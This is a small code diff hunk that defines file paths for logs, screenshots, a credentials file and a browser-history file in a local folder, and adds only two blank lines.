@@ -11,3 +11,5 @@ logs_file = folder_path + '\\logs.txt'
 screen_shots = folder_path + '\\Screenshots'
 creds = folder_path + '\\creds.txt'
 browser_file =  folder_path + '\\history.txt'
+
+
